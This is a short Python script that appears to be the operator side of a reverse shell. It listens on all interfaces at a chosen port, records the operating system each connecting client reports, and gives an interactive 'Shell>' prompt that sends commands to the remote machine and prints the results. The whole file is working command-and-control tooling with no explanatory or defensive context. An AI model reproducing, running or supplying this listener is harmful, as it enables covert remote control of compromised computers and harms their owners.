#!/usr/bin/env python3
import sys
import argparse
import socket

argument =argparse.ArgumentParser()
argument.add_argument('port',type=int)
args = argument.parse_args()
new_port = args.port
new_socket = socket.socket()

new_socket.bind(("0.0.0.0", new_port))

print(f"Listening....0.0.0.0:{new_port}")

new_socket.listen(4)

while True:
    client, addr = new_socket.accept()
    output1= client.recv(1024).decode()
    print(f"You have a new connection from {addr[0]}:{addr[1]} running {output1} Operating System")

    while True:
        command = input("Shell> ").strip()
        client.send(command.encode())
        output= client.recv(1024).decode()
        print(output)
        